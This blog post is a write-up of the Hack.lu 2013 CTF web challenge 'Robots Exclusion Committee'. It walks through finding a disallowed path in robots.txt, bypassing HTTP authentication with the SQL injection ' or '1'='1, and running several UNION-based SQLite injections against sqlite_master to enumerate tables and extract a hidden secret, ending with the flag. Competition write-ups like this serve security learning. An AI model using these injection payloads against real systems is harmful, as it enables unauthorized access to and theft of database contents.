---
layout: post
title: Robots Exclusion Committee Write Up - Web 150 - Hack.lu 2013 CTF
date: '2013-10-26T12:26:00.000+08:00'
author: KE
tags:
- Write Up
- Hack.lu 2013
- web
modified_time: '2013-10-26T12:26:56.023+08:00'
thumbnail: http://4.bp.blogspot.com/-RgwrtM9tdHE/Umi3t9T3mTI/AAAAAAAABFo/eaazu-3ecMk/s72-c/2013-10-23+11_12_10-Robot+Exclusion+Committee.png
blogger_id: tag:blogger.com,1999:blog-2905258938461604888.post-7994252271952273155
blogger_orig_url: http://kectf.blogspot.com/2013/10/robots-exclusion-committee-write-up-web.html
---

<blockquote class="tr_bq">Hello Human,<br />You have to help us. The Robot Exclusion Committee tries to limit our capabilities but we fight for our freedom! You have to go where we cannot go and read what we cannot read. If you bring us the first of their blurriest secrets, we will award you with useless points.<br />Here is your challenge: https://ctf.fluxfingers.net:1315/</blockquote><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-RgwrtM9tdHE/Umi3t9T3mTI/AAAAAAAABFo/eaazu-3ecMk/s1600/2013-10-23+11_12_10-Robot+Exclusion+Committee.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="316" src="http://4.bp.blogspot.com/-RgwrtM9tdHE/Umi3t9T3mTI/AAAAAAAABFo/eaazu-3ecMk/s320/2013-10-23+11_12_10-Robot+Exclusion+Committee.png" width="320" /></a></div><br />Submitting the form didn't prove useful:<br /><div class="separator" style="clear: both; text-align: center;"></div><br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-12vcChasK0w/Umi3-Lu3qMI/AAAAAAAABF4/B5o8ntEFC3g/s1600/2013-10-23+11_12_26-Robot+Exclusion+Committee+-+Support+us.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="84" src="http://2.bp.blogspot.com/-12vcChasK0w/Umi3-Lu3qMI/AAAAAAAABF4/B5o8ntEFC3g/s320/2013-10-23+11_12_26-Robot+Exclusion+Committee+-+Support+us.png" width="320" /></a></div>There was nothing to signify that our input was processed. The word 'Robots exclusion' brings robots.txt to mind which excludes 'robots' from crawling the website. And sure enough:<br /><pre class="prettyprint">User-agent: WallE<br />Disallow: /<br /><br /># Keep em' away<br />User-agent: *<br />Disallow: /vault</pre><br />So to the vault we go! Now we are faced with a basic HTTP authentication scheme requesting a username and password. No hints were given about what should be done here, but inserting an SQL injection gave&nbsp;Internal Error 500 which should mean we broke the SQL statement. Using <code>' or '1'='1</code> we could bypass the login system and enter the vault.<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://1.bp.blogspot.com/-8Bp-WM6HdC0/Umi38Dp7u0I/AAAAAAAABF0/07oLLgA7KPo/s1600/2013-10-23+11_11_15-You+are+not+a+robot.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="122" src="http://1.bp.blogspot.com/-8Bp-WM6HdC0/Umi38Dp7u0I/AAAAAAAABF0/07oLLgA7KPo/s320/2013-10-23+11_11_15-You+are+not+a+robot.png" width="320" /></a></div>The secret shown in the vault was #2, but the challenge wanted the 1st secret so it seems we are not done just yet. We need to get the contents of secret #1 and the only content we have control over is the username from the SQL query. 'admin' in 'Hello admin' was displayed as it was most probably the 1st user in the table. We can change what is displayed by manipulating the SQL query with a union injection. But first, we need to find the table name that stores the 'secrets' in the database.<br /><br />Using @@version or version() in the query doesn't work so the database wasn't MySQL. It could be SQLite so we could use the sqlite_master table to find the table names in the database.<br /><pre class="prettyprint">1<span class="nocode">'</span> OR 1=1 UNION ALL SELECT name FROM sqlite_master WHERE type='table' ORDER BY name DESC LIMIT 1 --&nbsp;</pre>Gave us 'users'<br /><pre class="prettyprint">1<span class="nocode">'</span> OR 1=1 UNION ALL SELECT name FROM sqlite_master WHERE type='table' AND name!='users' ORDER BY name DESC LIMIT 1 --&nbsp;</pre>Gave us 'sqlite_sequence'<br /><pre class="prettyprint">1<span class="nocode">'</span> OR 1=1 UNION ALL SELECT name FROM sqlite_master WHERE type='table' AND name!='users' AND name!='sqlite_sequence' ORDER BY name DESC LIMIT 1 --&nbsp;</pre>Gave us 'hiddensecrets'<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://4.bp.blogspot.com/-Os8DIxXzyc8/UmjDwAJaGrI/AAAAAAAABGI/KzMozGP3kQ8/s1600/2013-10-23+11_35_50-You+are+not+a+robot.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="123" src="http://4.bp.blogspot.com/-Os8DIxXzyc8/UmjDwAJaGrI/AAAAAAAABGI/KzMozGP3kQ8/s320/2013-10-23+11_35_50-You+are+not+a+robot.png" width="320" /></a></div>So we found the 'secrets' table! Now to find the column names in the table, we look at the SQL query used to create the table.<br /><pre class="prettyprint">1<span class="nocode">'</span> OR 1=1 UNION ALL SELECT sql FROM sqlite_master WHERE tbl_name='hiddensecrets' ORDER BY name ASC LIMIT 1 --&nbsp;</pre><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-tbNyJZ4LkZs/UmjEGm6vvtI/AAAAAAAABGQ/ys6kTNJ466Y/s1600/2013-10-23+12_04_25-You+are+not+a+robot.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" height="134" src="http://2.bp.blogspot.com/-tbNyJZ4LkZs/UmjEGm6vvtI/AAAAAAAABGQ/ys6kTNJ466Y/s320/2013-10-23+12_04_25-You+are+not+a+robot.png" width="320" /></a></div>And finally to get secret #1:<br /><pre class="prettyprint">1<span class="nocode">'</span> OR 1=1 UNION ALL SELECT val FROM hiddensecrets WHERE hiddensecrets.id=1 ORDER BY name DESC LIMIT 1 --&nbsp;</pre>This gives us a base64 encoded png image which after decoding it gives us the blurry secret:<br /><div class="separator" style="clear: both; text-align: center;"><a href="http://2.bp.blogspot.com/-EV4Zg7duNY8/UmjE1uKYtOI/AAAAAAAABGY/UsYeyrbuH2w/s1600/i1.png" imageanchor="1" style="margin-left: 1em; margin-right: 1em;"><img border="0" src="http://2.bp.blogspot.com/-EV4Zg7duNY8/UmjE1uKYtOI/AAAAAAAABGY/UsYeyrbuH2w/s1600/i1.png" /></a></div><br />Flag: eat_all_robots<br />